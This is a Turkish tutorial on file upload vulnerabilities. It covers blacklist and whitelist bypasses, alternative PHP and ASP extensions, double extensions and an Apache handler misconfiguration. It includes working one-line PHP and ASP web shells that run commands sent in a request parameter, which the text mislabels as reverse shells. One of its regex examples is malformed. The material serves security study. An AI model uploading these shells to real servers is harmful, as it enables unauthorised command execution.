# Dosya Yükleme Saldırıları
Dosya yükleme zafiyetlerinin en temel nedeni, yüklenen dosyaların türü ve içeriğinin yeterli düzeyde doğrulanmamasıdır. Bu durumda saldırganlar herhangi bir dosya tipini yükleyebilir ve backend sunucuda zararlı kod çalıştırabilir. Bazı uygulamalar yalnızca belirli dosya türlerine izin verir. Ancak bu durumda bile zafiyetler söz konusu olabilir. Örneğin:
- Dosya yükleme üzerinden XSS veya XXE gibi farklı açıkların tetiklenmesi.
- Arka uç sunucuya yönelik DoS (Denial of Service) saldırılarının gerçekleştirilmesi.

# Dosya Yükleme Zafiyetlerinin Sömürüsü
Zafiyetin istismar edilebilmesi için ilk adım, uygulamanın hangi dil ve platform üzerinde çalıştığının tespit edilmesidir. zararlı script’ler, yalnızca sunucunun çalıştığı programlama diliyle uyumlu olduğunda kullanılabilir. Genellikle bu tespit, sayfa uzantıları üzerinden yapılabilir (.php, .asp, .aspx vb.). Ancak bazı modern framework’lerde web routes nedeniyle bu uzantılar gizlenmiş olabilir. Uygulama PHP tabanlı olduğunu varsayalım, dosya yükleme fonksiyonunun php uzantılı dosyaları kabul edip etmediğini test etmek için minimal bir reverse shell yüklenebilir:
```php
<?=`$_GET[0]`?> // 0 parametresini URL'den alır ve değeri işletim sistemi komutu olarak çalıştırır
```

Veya ASP için aşağıdaki reverse shell kullanılabilir:
```c#
<% eval request('cmd') %>
```

## İstemci Tarafı Dosya Uzantısı Kontrolü
İstemci tarafında çalışan her kod bizim kontrolümüzdedir. Web sunucusu front-end kodunu gönderir, ancak kod tarayıcıda çalıştırılır. Eğer back-end tarafında doğrulama yoksa, teorik olarak herhangi bir dosya türünü yükleyebiliriz.

## Back-end Tarafında Dosya Uzantısı Doğrulama
Genellikle iki yaygın yöntem vardır:
- blacklist ve whitelist kontrolü.

Ayrıca, doğrulama dosya tipini veya içerik tipini kontrol edebilir. En zayıf doğrulama yöntemi, sadece dosya uzantısını kara listeye karşı kontrol etmektir. 

### Blacklist
Örnek PHP kodu:
```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$extension = pathinfo($fileName, PATHINFO_EXTENSION);
$blacklist = array('php', 'php7', 'phps');

if (in_array($extension, $blacklist)) {
    echo "File type not allowed";
    die();
}
```

Bu kod, dosya uzantısını ($extension) alır ve black list uzantıları ile ($blacklist) karşılaştırır. Eğer listede varsa yükleme engellenir.

PHP bütün dosya uzantıları:
```
php
.php3
.php4
.php5
.php7
.pht
.phps
.phar
.phpt
.pgif
.phtml
.phtm
.inc
```

ASP dosya uzantıları:
```
.asp
.aspx
.config
.cer # (IIS <= 7.5)
.asa # (IIS <= 7.5)
shell.aspx;1.jpg # (IIS < 7.0)
shell.soap
```

### Whitelist
Whitelist Örneği:
```php
$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

Kod, dosya adının whitelisted resim uzantılarını içerip içermediğini regex ile kontrol ediyor. Sorun şu regex yalnızca dosya adının uzantıyı içerip içermediğine bakıyor, dosya adının uzantı ile bitip bitmediğini kontrol etmiyor. Regex sadece dosya adında izin verilen uzantıyı aradığı için, basit bir yöntem double extension kullanmak. Örneğin .jpg izinliyse, dosya adını shell.jpg.php yapabiliriz.

Bazı uygulamalar daha katı regex kullanır:
```php
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ... }
```

Bu regex yalnızca dosya adının son uzantısını kontrol eder. Önceki saldırı burada işe yaramaz. Ancak bazı durumlarda, web sunucusu konfigürasyonu nedeniyle hala istismar edilebilir.

Örnek Apache Konfigürasyonu:
```
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```

